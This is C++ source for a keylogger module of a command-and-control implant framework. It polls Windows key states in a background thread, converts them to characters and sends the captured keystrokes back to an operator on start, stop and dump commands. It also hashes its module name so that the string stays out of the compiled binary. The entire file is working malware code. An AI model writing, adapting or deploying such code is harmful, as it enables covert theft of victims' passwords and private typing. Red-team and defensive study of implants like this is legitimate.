#include "KeyLogger.hpp"

#include "Common.hpp"

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#endif

#include <cstring>

using namespace std;


// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "keyLogger";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32

__declspec(dllexport) KeyLogger* KeyLoggerConstructor() 
{
    return new KeyLogger();
}

#else

__attribute__((visibility("default"))) KeyLogger* KeyLoggerConstructor() 
{
    return new KeyLogger();
}

#endif

KeyLogger::KeyLogger()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
	m_isThreadLaunched=false;
}

KeyLogger::~KeyLogger()
{
}

std::string KeyLogger::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "keyLogger:\n";
	info += "keyLogger \n";
	info += "exemple:\n";
	info += "- keyLogger start\n";
	info += "- keyLogger stop\n";
	info += "- keyLogger dump\n";
#endif
	return info;
}

int KeyLogger::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if (splitedCmd.size() >= 2 )
	{
		if(splitedCmd[1]=="start")
		{
			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_args(splitedCmd[1]);
		}
		else if(splitedCmd[1]=="stop")
		{
			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_args(splitedCmd[1]);
		}
		else if(splitedCmd[1]=="dump") 
		{
			std::string output = "Dump:\n";
			output+=m_saveKeyStrock;
			c2Message.set_returnvalue(output);
			m_saveKeyStrock="";
			return -1;
		}
		else
		{
			c2Message.set_returnvalue(getInfo());
			return -1;
		}
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


int KeyLogger::recurringExec(C2Message& c2RetMessage) 
{
	std::string output;
	dumpKeys(output);

	c2RetMessage.set_instruction(std::to_string(getHash()));
	c2RetMessage.set_data(output);
	
	return 1;
}


int KeyLogger::followUp(const C2Message &c2RetMessage)
{
	m_saveKeyStrock+=c2RetMessage.data();

	return 0;
}


void KeyLogger::run(void* keyLoggerPtr) 
{
#ifdef __linux__
#elif _WIN32

	KeyLogger* data = (KeyLogger*)keyLoggerPtr;

	while (data->getIsThreadLaunched())
    {
		// note looking ofr backspace
        // for (int i = 0x8; i < 0xFE; i++)
		for (int i = 0x8; i < 0xFE; i++)
        {
			if (i != VK_LSHIFT
                && i != VK_RSHIFT
                && i != VK_SHIFT
                && i != VK_LCONTROL
                && i != VK_RCONTROL
                && i != VK_CONTROL
                && i != VK_LMENU
                && i != VK_RMENU
                && i != VK_MENU)
            {
				short keyState = GetAsyncKeyState(i);

				if ((keyState & 0x01))
				{
					HKL keyboardLayout = GetKeyboardLayout(0);
					
					bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

					if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 
						|| (GetKeyState(VK_LSHIFT) & 0x1000) != 0
						|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
					{
						lowercase = !lowercase;
					}

					UINT key = MapVirtualKeyExA(i, MAPVK_VK_TO_CHAR, keyboardLayout);
					
					if(key!=0)
					{
						BYTE keystate[256];
						GetKeyboardState(keystate);

						char finalCharPressed;
						int nchars = ToAscii( i, key, keystate, (LPWORD)&finalCharPressed, 0);

						data->setKey(finalCharPressed);
					}
				}
			}
        }
    }

#endif
}


#define ERROR_ALREADY_LAUNCHED 1 
#define ERROR_ALREADY_STOPED 2
#define ERROR_UNKNOWN 3


int KeyLogger::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	c2RetMessage.set_instruction(c2Message.instruction());
	std::string args = c2Message.args();

	if( args == "start") 
	{
		if(m_isThreadLaunched==false)
		{
			m_isThreadLaunched=true;
#ifdef __linux__
#elif _WIN32
			CreateThread(NULL, 0,  (LPTHREAD_START_ROUTINE) KeyLogger::run, this, 0, (LPDWORD)&this->threadID);
#endif
			c2RetMessage.set_returnvalue("launched");
		}
		else
		{
			c2RetMessage.set_errorCode(ERROR_ALREADY_LAUNCHED);
		}
	}
	else if( args == "stop") 
	{
		if(m_isThreadLaunched==true)
		{
			m_isThreadLaunched=false;
			c2RetMessage.set_returnvalue("stoped");
		}
		else
		{
			c2RetMessage.set_errorCode(ERROR_ALREADY_STOPED);
		}
	}
	else
	{
		c2RetMessage.set_errorCode(ERROR_UNKNOWN);
	}

	return 0;
}


int KeyLogger::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
	int errorCode = c2RetMessage.errorCode();
	if(errorCode>0)
	{
		if(errorCode==ERROR_ALREADY_LAUNCHED)
			errorMsg = "Failed: Already launched";
		else if(errorCode==ERROR_ALREADY_STOPED)
			errorMsg = "Failed: Already stoped";
		else if(errorCode==ERROR_UNKNOWN)
			errorMsg = "Failed: error unknown";
	}
#endif
	return 0;
}
